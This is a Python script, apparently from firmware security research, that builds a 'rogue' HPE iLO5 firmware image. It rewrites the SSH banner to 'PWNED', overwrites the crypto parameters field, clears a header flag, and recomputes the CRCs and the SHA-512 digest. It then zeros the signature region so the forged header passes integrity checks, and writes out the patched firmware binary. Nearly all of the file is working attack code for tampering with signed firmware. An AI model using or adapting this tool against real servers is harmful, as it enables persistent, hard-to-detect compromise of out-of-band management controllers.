#!/usr/bin/python

import sys
import os
import json
import os.path
import zlib
import struct
import shutil
import hashlib

from ilo5lib import *

LAYOUT_FILE = 'firmware.map'

if len(sys.argv) < 4:
    print "usage: %s <extract_dir> <patch_dir> <fw_bin>" % sys.argv[0]
    sys.exit(1)

extract_dir = sys.argv[1]
patch_dir = sys.argv[2]
fw_bin = sys.argv[3]

if not os.path.exists(extract_dir):
    print "[x] input directory does not exist"
    sys.exit(-1)

if not os.path.exists(patch_dir):
    os.makedirs(patch_dir)


# load JSON file containing firmware layout
def load_mapping(extract_dir):
    target = os.path.join(extract_dir, LAYOUT_FILE)
    if not os.path.isfile(target):
        exit("[x] layout file not found: %s" % target)
    with open(target, 'r') as json_file:
        layout = json.load(json_file)
        print "[>] firmware layout:"
        print json.dumps(layout, indent=4, sort_keys=True)
        
    return layout
        

def load_component(dir, file):
    target = os.path.join(dir, file)
    if not os.path.isfile(target):
        exit("[x] component file not found: %s" % target)
    with open(target, 'rb') as bin_file:
        return bin_file.read()
        
    return None
        
layout = load_mapping(extract_dir)
elf_hdr = load_component(extract_dir, 'elf_main.hdr')
elf_bin = load_component(extract_dir, 'elf_main.bin')

elf_bin = elf_bin.replace("SSH-2.0-mpSSH_0.2.1", "SSH-2.0-PWNED_0.2.1")

img = ImageHeader.from_buffer_copy(elf_hdr)
img.dump()

# patch crypto params
rogue_hdr = elf_hdr
rogue_hdr = rogue_hdr[:0x58] + struct.pack('<L', 0xFFFFFFFF) + rogue_hdr[0x5C:]
print "> crypto parameters patched"

# flags
flags = struct.unpack_from("<L", rogue_hdr[0x2c:])[0]
rogue_hdr = rogue_hdr[:0x2c] + struct.pack("<L", flags & 0xfffffffe) + rogue_hdr[0x30:]
print "> flags patched"

# forward offset crc
rogue_hdr = rogue_hdr[:0x40] + struct.pack('<L', len(elf_bin)) + rogue_hdr[0x44:]
print "> forward crc offset patched"

# patch compressed/decompressed size
rogue_hdr = rogue_hdr[:0x48] + struct.pack('<L', len(elf_bin)) + rogue_hdr[0x4c:]
rogue_hdr = rogue_hdr[:0x4c] + struct.pack('<L', len(elf_bin)) + rogue_hdr[0x50:]
print "> compressed and decompressed sizes patched"

# fix img crc
rogue_img_crc = zlib.crc32(elf_bin) & 0xffffffff
rogue_hdr = rogue_hdr[:0x44] + struct.pack('<L', rogue_img_crc) + rogue_hdr[0x48:]
print "> rogue img crc: 0x%08x" % rogue_img_crc

# fix header crc
rogue_hdr_crc = zlib.crc32(rogue_hdr[:0x58] + rogue_hdr[0x60:0x100]) & 0xffffffff
rogue_hdr = rogue_hdr[:0x5C] + struct.pack('<L', rogue_hdr_crc) + rogue_hdr[0x60:]
print "> rogue header crc: 0x%08x" % rogue_hdr_crc

# compute sha512 digest of component
digest = hashlib.sha512()

# hashing header
digest.update(rogue_hdr[:0x58])
digest.update(rogue_hdr[0x5C:0x100])

# hashing img bytes
digest.update(elf_bin)

print "> component digest:"
print digest.hexdigest()

# forge rogue header

rogue_hdr = rogue_hdr[:0x100] + digest.digest() + ("\x00"*0x1C0) + rogue_hdr[0x300:]

target = os.path.join(patch_dir, 'elf_main.hdr')
with open(target, 'wb') as fd:
    fd.write(rogue_hdr)
    
print "> rogue header written\n"

print "> dumping rogue header:"
img = ImageHeader.from_buffer_copy(rogue_hdr)
img.dump()

check_header_crc(rogue_hdr, img)

elf_hdr_offset = layout['ELF_MAIN_HDR']
elf_data_offset = layout['ELF_MAIN']
print "> ELF header at 0x%08x" % elf_hdr_offset
print "> ELF data at 0x%08x" % elf_data_offset


fw = load_component('.', fw_bin)
target = os.path.join(patch_dir, fw_bin+'.rogue')
with open(target, 'wb') as fd:
    fd.write(fw[:elf_hdr_offset])
    fd.write(rogue_hdr)
    fd.write(elf_bin)
    fd.write(fw[elf_data_offset+len(elf_bin):])
    
print "> %s written" % target
